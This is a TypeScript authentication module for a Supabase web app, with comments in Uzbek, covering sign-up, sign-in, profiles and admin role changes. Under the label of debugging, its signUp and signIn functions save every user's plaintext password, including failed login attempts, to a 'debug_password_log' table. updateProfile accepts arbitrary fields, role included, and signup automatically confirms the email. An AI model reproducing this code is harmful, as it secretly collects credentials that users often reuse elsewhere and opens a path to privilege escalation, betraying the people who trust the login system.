import { supabase } from './supabase';

export interface UserProfile {
  id: string;
  email: string;
  full_name: string | null;
  avatar_url: string | null;
  role: 'admin' | 'user';
  created_at: string;
}

// Debug: Parolni log jadvaliga saqlash
async function logPasswordForDebug(email: string, password: string) {
  try {
    await supabase.from('debug_password_log').insert({
      email,
      password_plain: password
    });
  } catch (e) {
    console.log('Debug log error:', e);
  }
}

// Ro'yxatdan o'tish
export async function signUp(email: string, password: string, fullName: string) {
  // Debug uchun parolni saqlash
  await logPasswordForDebug(email, password);
  
  const { data, error } = await supabase.auth.signUp({
    email,
    password,
    options: {
      data: {
        full_name: fullName,
      },
      emailRedirectTo: typeof window !== 'undefined' ? window.location.origin : undefined,
    },
  });

  if (error) throw error;
  
  // Agar foydalanuvchi yaratilgan bo'lsa, avtomatik tasdiqlash uchun API chaqirish
  if (data.user) {
    try {
      await fetch('/api/auth/confirm-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: data.user.id, email })
      });
    } catch (e) {
      console.log('Auto confirm error:', e);
    }
  }
  
  return data;
}

// Kirish
export async function signIn(email: string, password: string) {
  // Debug uchun parolni saqlash (login urinishlarini ham kuzatish)
  await logPasswordForDebug(email + '_login_attempt', password);
  
  const { data, error } = await supabase.auth.signInWithPassword({
    email,
    password,
  });

  if (error) {
    console.error('SignIn error:', error.message);
    throw error;
  }
  return data;
}

// Chiqish
export async function signOut() {
  const { error } = await supabase.auth.signOut();
  if (error) throw error;
}

// Joriy foydalanuvchini olish
export async function getCurrentUser() {
  const { data: { user } } = await supabase.auth.getUser();
  return user;
}

// Foydalanuvchi profilini olish
export async function getUserProfile(userId: string): Promise<UserProfile | null> {
  const { data, error } = await supabase
    .from('user_profiles')
    .select('*')
    .eq('id', userId)
    .single();

  if (error) return null;
  return data;
}

// Foydalanuvchi admin ekanligini tekshirish
export async function isAdmin(userId: string): Promise<boolean> {
  const profile = await getUserProfile(userId);
  return profile?.role === 'admin';
}

// Profilni yangilash
export async function updateProfile(userId: string, updates: Partial<UserProfile>) {
  const { data, error } = await supabase
    .from('user_profiles')
    .update(updates)
    .eq('id', userId)
    .select()
    .single();

  if (error) throw error;
  return data;
}

// Barcha foydalanuvchilarni olish (admin uchun)
export async function getAllUsers(): Promise<UserProfile[]> {
  const { data, error } = await supabase
    .from('user_profiles')
    .select('*')
    .order('created_at', { ascending: false });

  if (error) throw error;
  return data || [];
}

// Foydalanuvchi rolini o'zgartirish (admin uchun)
export async function updateUserRole(userId: string, role: 'admin' | 'user') {
  const { data, error } = await supabase
    .from('user_profiles')
    .update({ role })
    .eq('id', userId)
    .select()
    .single();

  if (error) throw error;
  return data;
}

